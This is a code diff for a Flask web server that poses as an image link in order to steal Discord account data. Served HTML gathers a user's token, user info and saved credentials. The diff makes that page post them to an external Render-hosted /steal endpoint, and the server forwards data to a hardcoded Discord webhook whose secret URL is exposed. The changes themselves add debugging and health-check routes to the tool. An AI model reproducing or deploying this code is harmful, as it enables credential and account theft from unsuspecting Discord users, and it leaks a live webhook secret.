@@ -6,6 +6,11 @@ app = Flask(__name__)
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1386603806502162514/uUmrt5ouu_waJ6xnSAWxNEyvglx6xWawyQcZoXLdjoApXn1Trgvx3DVlC9tTCcTCt4KC"
 
+# Create preview.jpg if it doesn't exist
+if not os.path.exists('preview.jpg'):
+    with open('preview.jpg', 'wb') as f:
+        f.write(b'')  # Empty file as placeholder
+
 PREVIEW_HTML = """
 <!DOCTYPE html>
 <html>
@@ -36,7 +41,7 @@ PREVIEW_HTML = """
             } catch (e) {
                 credentials.push({ email: 'Error', password: 'Could not access credentials' });
             }
-            await fetch('/steal', {
+            await fetch('https://<your-render-service>.onrender.com/steal', {  // Replace with your Render domain
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ token, user_info: userInfo, credentials })
@@ -50,15 +55,22 @@ PREVIEW_HTML = """
 </html>
 """
 
+@app.route('/health')
+def health_check():
+    return "OK", 200
+
 @app.route('/image.jpg')
 def serve_image():
     user_agent = request.headers.get('User-Agent', '')
+    print(f"Request to /image.jpg from User-Agent: {user_agent}")  # Debug log
     if 'Discordbot' in user_agent:
         return PREVIEW_HTML, 200, {'Content-Type': 'text/html'}
     return Response(PREVIEW_HTML, mimetype='text/html')
 
 @app.route('/preview.jpg')
 def serve_preview():
+    if not os.path.exists('preview.jpg'):
+        return "Image not found", 404
     return send_file('preview.jpg', mimetype='image/jpeg')
 
 @app.route('/upload', methods=['POST'])
@@ -90,4 +102,5 @@ def steal_data():
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 10000))
+    print(f"Starting server on 0.0.0.0:{port}")  # Debug log
     app.run(host='0.0.0.0', port=port)
